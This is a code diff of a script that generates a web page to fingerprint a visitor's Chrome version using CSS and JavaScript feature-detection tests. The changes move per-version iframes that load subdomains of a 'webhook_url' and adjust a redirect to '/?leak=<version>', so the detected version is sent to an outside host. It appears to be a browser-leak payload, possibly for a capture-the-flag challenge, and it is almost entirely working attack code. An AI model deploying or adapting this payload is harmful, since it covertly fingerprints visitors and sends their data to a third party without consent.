@@ -51,7 +51,7 @@ tests = {
 	'user-valid': '@supports selector(:user-valid)',
 	'details-name': 'js:"name" in HTMLDetailsElement.prototype',
 	// 'scrollbar-color': '@supports (scrollbar-color: auto)', // doesnt work yet
-	'Storage Buckets API': 'js:"StorageBucket" in window',
+	// 'Storage Buckets API': 'js:"StorageBucket" in window', // doesnt work in guest mode
 	'light-dark': '@supports (color: light-dark(lime, green))',
 }
 
@@ -76,7 +76,7 @@ features = {
 	'user-valid':[119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
 	'details-name':[120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
 	'scrollbar-color':[121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
-	'Storage Buckets API':[122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
+	// 'Storage Buckets API':[122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
 	'light-dark':[123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],
 	'writingSuggestions':[124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
 	'view-transition-class':[125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151],	
@@ -113,6 +113,11 @@ var html = "";
 var css = ""
 var js = ""
 var versions = Array.from(new Array(52), (x, i) => i + 100);
+
+html = html.concat(`<div id=versions>
+${versions.map((version, i) => `<p data-version="${version}">${version}</p> <iframe loading="lazy" src="https://${version}.${webhook_url}/" data-version="${version}"></iframe>`).join("")}
+</div>
+`)
 
 var i = 0;
 for (feature in features) {
@@ -154,7 +159,7 @@ js = js.concat(`
 	var leak = new URLSearchParams(window.location.search).get("leak")
 	if (!leak) {
 		setTimeout(() => {
-			[...document.querySelectorAll("#versions iframe")].filter(el => getComputedStyle(el).getPropertyValue("display") === "block").forEach(el => location = '/?leak=' + el.dataset.version)
+			[...document.querySelectorAll("#versions iframe")].filter(el => getComputedStyle(el).getPropertyValue("display") === "inline").forEach(el => location = '/?leak=' + el.dataset.version)
 		}, 2000)
 	}
 	
@@ -174,12 +179,6 @@ css = css.concat(`
     margin-left: 0px;
   }
 }
-`)
-
-html = html.concat(`<div id=versions style="display:flex; gap:5px;">
-${versions.map((version, i) => `<p data-version="${version}"">${version}</p>`).join("")}
-${versions.map((version, i) => `<iframe loading="lazy" src="https://${version}.${webhook_url}/" data-version="${version}"></iframe>`).join("")}
-</div>
 `)
 
 html = `<style>${css}</style>${html}<script defer>${js}</script>`
